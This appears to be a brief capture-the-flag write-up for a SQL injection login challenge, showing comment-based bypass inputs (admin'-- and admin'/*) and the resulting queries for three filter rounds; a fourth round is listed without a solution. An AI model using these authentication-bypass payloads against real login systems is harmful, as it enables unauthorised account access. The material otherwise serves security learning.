
Round 1 - filter: or
```sql
input: admin'--
SELECT * FROM users WHERE username='admin'--' AND password='a'
```
Round 2 - filter: or and like = --

```sql
input: admin'/*
SELECT * FROM users WHERE username='admin'/*' AND password='a'
```

Round 3 - filter: or and = like > < --
```sql
input: admin'/*
SELECT * FROM users WHERE username='admin'/*' AND password='a'
```

Round 4 - filter: or and = like > < -- admin
